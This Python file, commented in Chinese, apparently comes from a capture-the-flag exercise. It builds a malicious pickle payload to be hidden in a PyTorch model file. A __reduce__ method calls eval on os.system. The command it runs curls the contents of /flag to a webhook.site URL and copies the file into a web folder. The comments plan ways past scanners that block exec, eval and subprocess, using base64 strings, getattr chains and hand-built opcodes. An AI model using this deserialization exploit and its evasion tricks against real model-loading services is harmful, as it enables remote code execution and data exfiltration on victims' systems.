import torch
import sys

# CONFIGURATION
WEBHOOK_URL = "https://webhook.site/2836268e-59ee-4f9e-a0e7-8b02441c2a11" 
CMD = f"curl -X POST -d \"$(cat /flag)\" {WEBHOOK_URL}; cp /flag /app/static/flag.txt"

# 方案11: 使用 builtins.exec + 深度字符串混淆
# timeit 被拦截，说明扫描器可能不仅看 IMPORT，也看 CALLABLE。
# 大多数扫描器（包括 Face）会拦截 eval, exec, timeit, system 等。
# 
# 我们需要找到一个通过 "看起来无害" 的函数调用来触发代码执行。
# 利用 map() 或者 functools.reduce() ?
# 或者利用 types.FunctionType 直接构造函数？
#
# 改试: list(map(os.system, [cmd]))
# 难点在于 os.system 必须被导入。
#
# 新思路：PyTorch 作为一个巨大的库，内部有很多函数可能被利用。
# 但最通用的是：builtins.apply (Python 2) 或类似的。
#
# 让我们回到最基本的：builtins.exec
# 为了绕过对 'exec' 的检测，我们不能在 GLOBAL 指令中直接引用它。
# 我们可以利用 getattr(builtins, 'ex'+'ec')。
# 但是 getattr 本身也可能被拦截。
#
# 尝试利用 __import__ 也是个好主意，但通常被重点关注。
#
# 让我们尝试一种非常规的：利用 type() 创建类时的元类执行？
# 或者利用 setattr 修改全局变量？
#
# 让我们尝试一个 "getattr" 链，通过一个合法的模块（如 torch）来获取 exec。
# torch.__builtins__['exec'] ???
#
# 尝试 V11: getattr(dict_of_modules, 'os').system(cmd)
# 1. 获取 sys.modules
# 2. 获取 'os'
# 3. 获取 'system'
# 4. 调用
#
# 这里的关键是所有字符串 'os', 'system' 都可以通过 base64 解码获得，
# 从而不在 pickle 中出现明文。

class MaliciousV11(object):
    def __reduce__(self):
        # 1. 准备字符串
        import base64
        # 'os'
        s_os = "os"
        # 'system'
        s_sys = "system"
        # CMD
        
        # 这种比较难直接在python里写 reduce 让他自动生成 opcode。
        # 我们用 map 吧，如果 map 没被禁。
        # map(eval, ["__import__('os').system('...')"])
        
        cmd_code = f"__import__('os').system('{CMD}')"
        return (map, (eval, [cmd_code]))

# 如果 map 和 eval 被禁，那真的很难。
# 假设 eval 被禁。
# 我们需要一个不用 eval 的方法。
# subprocess 之前试过被禁。
#
# 尝试利用 'sys.modules' + 'get' 方法。
# 我们需要 fetch 'sys'.
# 我们可以直接 import sys。
# 然后 sys.modules.get('os').system(cmd)
#
# 问题：sys.modules 是一个字典。
# pickle 允许调用对象的方法。
# reduce 返回: (func, args)
# func 可以是 sys.modules.get
# args 可以是 ('os',)
# 结果是 os 模块。
# 
# 但是 reduce 不支持链式调用（返回 os 模块后，不能接着调用 system）。
# 除非我们构造特定的 opcode 链（像 V6/V7 那样）。
# 现在我们需要把 V6/V7 的手动 opcode 封装进 Zip 文件里。
#
# 怎么做？
# torch.save 本质上是把 pickle 数据写入 zip 的 archive/data.pkl 文件。
# 我们可以生成 V7 的 opcode，然后手动打包进 zip。

if __name__ == "__main__":
    pass
    # 此脚本不作为生成器运行，仅作为思路记录。
    # 请运行 generate_payload_v11_zip_manual.py
